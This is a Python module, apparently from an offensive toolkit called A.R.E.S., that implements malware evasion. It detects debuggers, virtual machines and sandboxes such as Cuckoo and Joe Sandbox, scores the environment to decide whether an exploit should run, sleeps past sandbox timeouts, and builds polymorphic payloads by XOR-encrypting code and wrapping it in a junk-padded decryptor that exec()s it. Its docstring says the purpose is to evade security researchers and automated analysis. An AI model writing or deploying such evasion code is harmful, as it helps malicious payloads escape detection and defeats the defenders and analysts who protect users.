"""
Advanced Evasion Techniques

This module implements sophisticated evasion methods:
- Anti-debugging detection
- Sandbox/VM detection
- Timing attacks
- Environment fingerprinting
- Polymorphic code generation
- Encrypted payload delivery

These techniques help exploits evade detection by:
- Security researchers
- Automated analysis systems
- Sandboxes (Cuckoo, Joe Sandbox, etc.)
"""

import os
import sys
import time
import hashlib
import random
import string
from typing import Dict, Any, List, Optional
from dataclasses import dataclass
import platform


@dataclass
class EnvironmentProfile:
    """Detected environment characteristics"""
    is_debugger: bool = False
    is_sandbox: bool = False
    is_vm: bool = False
    os_type: str = ""
    cpu_count: int = 0
    ram_mb: int = 0
    uptime_seconds: int = 0
    risk_score: float = 0.0  # 0.0 = safe, 1.0 = highly suspicious


class AntiDebuggingDetector:
    """
    Detect if code is running under a debugger
    
    Techniques:
    - Timing attacks (debugger slows execution)
    - Process inspection
    - Exception handling differences
    """
    
    @staticmethod
    def timing_check() -> bool:
        """
        Detect debugger via timing attack
        
        Debuggers slow down execution significantly
        """
        iterations = 1000000
        
        start = time.perf_counter()
        for _ in range(iterations):
            pass
        end = time.perf_counter()
        
        elapsed = end - start
        
        # If too slow, likely debugger
        threshold = 0.1  # 100ms for 1M iterations
        
        if elapsed > threshold:
            return True  # Debugger detected
        
        return False
    
    @staticmethod
    def process_check() -> bool:
        """Check for debugger processes"""
        
        debugger_processes = [
            "gdb", "lldb", "ida", "ollydbg", "x64dbg", "windbg",
            "radare2", "ghidra", "immunity", "edb"
        ]
        
        try:
            if platform.system() == "Windows":
                import psutil
                for proc in psutil.process_iter(['name']):
                    if any(dbg in proc.info['name'].lower() for dbg in debugger_processes):
                        return True
            else:
                # Linux/Mac: check /proc
                import subprocess
                result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
                for dbg in debugger_processes:
                    if dbg in result.stdout.lower():
                        return True
        except:
            pass
        
        return False
    
    @staticmethod
    def exception_check() -> bool:
        """
        Debuggers handle exceptions differently
        
        This is a simplified check
        """
        try:
            # Intentional division by zero
            _ = 1 / 0
        except ZeroDivisionError:
            # Normal behavior
            return False
        except:
            # Abnormal - possible debugger
            return True
        
        return False
    
    @classmethod
    def detect(cls) -> bool:
        """Run all anti-debugging checks"""
        
        checks = [
            cls.timing_check(),
            cls.process_check(),
            # cls.exception_check(),  # Can be noisy
        ]
        
        # If any check returns True, debugger detected
        return any(checks)


class SandboxDetector:
    """
    Detect if code is running in a sandbox/analysis environment
    
    Techniques:
    - VM detection (VMware, VirtualBox, QEMU)
    - Sandbox artifacts (Cuckoo, Joe Sandbox)
    - Resource constraints (low RAM, few CPUs)
    - Unrealistic uptime
    """
    
    @staticmethod
    def vm_detection() -> bool:
        """Detect virtual machine"""
        
        vm_indicators = {
            "Windows": [
                "vmware", "virtualbox", "vbox", "qemu", "xen", "kvm",
                "parallels", "hyper-v"
            ],
            "Linux": [
                "vmware", "virtualbox", "qemu", "xen", "kvm"
            ],
            "Darwin": [
                "vmware", "parallels", "virtualbox"
            ]
        }
        
        os_type = platform.system()
        indicators = vm_indicators.get(os_type, [])
        
        try:
            # Check system info
            system_info = platform.platform().lower()
            
            for indicator in indicators:
                if indicator in system_info:
                    return True
            
            # Check hardware
            if platform.system() == "Windows":
                import wmi
                c = wmi.WMI()
                for item in c.Win32_ComputerSystem():
                    if any(vm in item.Model.lower() for vm in indicators):
                        return True
            
        except:
            pass
        
        return False
    
    @staticmethod
    def sandbox_artifacts() -> bool:
        """Check for sandbox-specific files/processes"""
        
        sandbox_files = [
            # Cuckoo
            "C:\\cuckoo\\",
            "/opt/cuckoo/",
            
            # Joe Sandbox
            "C:\\joesandbox\\",
            
            # Any.run
            "C:\\analysis\\",
            
            # Generic
            "C:\\sample\\",
            "C:\\malware\\",
        ]
        
        for path in sandbox_files:
            if os.path.exists(path):
                return True
        
        return False
    
    @staticmethod
    def resource_check() -> bool:
        """
        Sandboxes often have limited resources
        
        Real machines typically have:
        - 4+ CPU cores
        - 4+ GB RAM
        """
        import psutil
        
        cpu_count = psutil.cpu_count()
        ram_gb = psutil.virtual_memory().total / (1024**3)
        
        # Suspicious if too few resources
        if cpu_count < 2 or ram_gb < 2:
            return True
        
        return False
    
    @staticmethod
    def uptime_check() -> bool:
        """
        Sandboxes are often freshly booted
        
        Real machines have longer uptime
        """
        try:
            import psutil
            uptime_seconds = time.time() - psutil.boot_time()
            
            # Suspicious if uptime < 10 minutes
            if uptime_seconds < 600:
                return True
        except:
            pass
        
        return False
    
    @classmethod
    def detect(cls) -> bool:
        """Run all sandbox detection checks"""
        
        checks = [
            cls.vm_detection(),
            cls.sandbox_artifacts(),
            cls.resource_check(),
            cls.uptime_check(),
        ]
        
        # If 2+ checks return True, likely sandbox
        return sum(checks) >= 2


class PolymorphicCodeGenerator:
    """
    Generate polymorphic code that changes each time
    
    Techniques:
    - Variable name randomization
    - Instruction reordering
    - Junk code insertion
    - Encryption with random keys
    """
    
    @staticmethod
    def random_var_name(length: int = 8) -> str:
        """Generate random variable name"""
        return '_' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    
    @staticmethod
    def insert_junk_code(code: str, junk_ratio: float = 0.2) -> str:
        """Insert junk code that does nothing"""
        
        junk_snippets = [
            "_ = {random.randint(0, 1000)}",
            "_ = '{random_string}'",
            "_ = [i for i in range({random.randint(1, 10)})]",
            "import time; _ = time.time()",
            "_ = len(str({random.randint(0, 1000)}))",
        ]
        
        lines = code.split('\n')
        num_junk = int(len(lines) * junk_ratio)
        
        for _ in range(num_junk):
            junk = random.choice(junk_snippets)
            junk = junk.format(
                random_string=''.join(random.choices(string.ascii_letters, k=10)),
                **{'random': random}
            )
            
            pos = random.randint(0, len(lines))
            lines.insert(pos, junk)
        
        return '\n'.join(lines)
    
    @staticmethod
    def encrypt_payload(payload: str, key: Optional[bytes] = None) -> tuple[bytes, bytes]:
        """
        XOR encrypt payload with random key
        
        Returns:
            (encrypted_payload, key)
        """
        if key is None:
            key = os.urandom(32)
        
        encrypted = bytearray()
        for i, byte in enumerate(payload.encode()):
            encrypted.append(byte ^ key[i % len(key)])
        
        return bytes(encrypted), key
    
    @staticmethod
    def generate_decryptor(encrypted: bytes, key: bytes, var_prefix: str = "") -> str:
        """Generate Python code to decrypt and execute payload"""
        
        if not var_prefix:
            var_prefix = PolymorphicCodeGenerator.random_var_name()
        
        encrypted_hex = encrypted.hex()
        key_hex = key.hex()
        
        decryptor = f"""
{var_prefix}_enc = bytes.fromhex('{encrypted_hex}')
{var_prefix}_key = bytes.fromhex('{key_hex}')
{var_prefix}_dec = bytearray()
for {var_prefix}_i, {var_prefix}_b in enumerate({var_prefix}_enc):
    {var_prefix}_dec.append({var_prefix}_b ^ {var_prefix}_key[{var_prefix}_i % len({var_prefix}_key)])
exec({var_prefix}_dec.decode())
"""
        return decryptor


class EvasionOrchestrator:
    """
    Main evasion orchestrator
    
    Combines all evasion techniques
    """
    
    @staticmethod
    def analyze_environment() -> EnvironmentProfile:
        """Analyze current environment"""
        
        profile = EnvironmentProfile()
        
        # Detect debugger
        profile.is_debugger = AntiDebuggingDetector.detect()
        
        # Detect sandbox
        profile.is_sandbox = SandboxDetector.detect()
        
        # Get system info
        profile.os_type = platform.system()
        
        try:
            import psutil
            profile.cpu_count = psutil.cpu_count()
            profile.ram_mb = int(psutil.virtual_memory().total / (1024**2))
            profile.uptime_seconds = int(time.time() - psutil.boot_time())
        except:
            pass
        
        # Calculate risk score
        risk_factors = [
            profile.is_debugger,
            profile.is_sandbox,
            profile.cpu_count < 2,
            profile.ram_mb < 2048,
            profile.uptime_seconds < 600
        ]
        
        profile.risk_score = sum(risk_factors) / len(risk_factors)
        
        return profile
    
    @staticmethod
    def should_execute(threshold: float = 0.5) -> bool:
        """
        Decide if exploit should execute
        
        Args:
            threshold: Risk threshold (0.0-1.0)
        
        Returns:
            True if safe to execute, False if too risky
        """
        profile = EvasionOrchestrator.analyze_environment()
        
        return profile.risk_score < threshold
    
    @staticmethod
    def sleep_evasion(min_seconds: int = 60):
        """
        Sleep to evade sandbox timeout
        
        Many sandboxes timeout after 60-120 seconds
        """
        time.sleep(min_seconds)
    
    @staticmethod
    def create_polymorphic_payload(original_code: str) -> str:
        """
        Create polymorphic version of payload
        
        Args:
            original_code: Original exploit code
        
        Returns:
            Polymorphic version
        """
        gen = PolymorphicCodeGenerator()
        
        # Encrypt payload
        encrypted, key = gen.encrypt_payload(original_code)
        
        # Generate decryptor
        decryptor = gen.generate_decryptor(encrypted, key)
        
        # Add junk code
        polymorphic = gen.insert_junk_code(decryptor, junk_ratio=0.3)
        
        return polymorphic


# Example usage
if __name__ == "__main__":
    print("="*60)
    print("A.R.E.S. Advanced Evasion Techniques")
    print("="*60)
    
    # Analyze environment
    profile = EvasionOrchestrator.analyze_environment()
    
    print(f"\n=== Environment Analysis ===")
    print(f"Debugger Detected: {profile.is_debugger}")
    print(f"Sandbox Detected: {profile.is_sandbox}")
    print(f"OS: {profile.os_type}")
    print(f"CPUs: {profile.cpu_count}")
    print(f"RAM: {profile.ram_mb} MB")
    print(f"Uptime: {profile.uptime_seconds} seconds")
    print(f"Risk Score: {profile.risk_score:.2f}")
    
    # Decide execution
    should_run = EvasionOrchestrator.should_execute(threshold=0.5)
    print(f"\nShould Execute: {should_run}")
    
    if should_run:
        print("\n✓ Environment appears safe")
        
        # Demo polymorphic code
        original = "print('Hello from exploit')"
        polymorphic = EvasionOrchestrator.create_polymorphic_payload(original)
        
        print(f"\n=== Polymorphic Code ===")
        print(polymorphic[:200] + "...")
    else:
        print("\n✗ Suspicious environment detected - aborting")
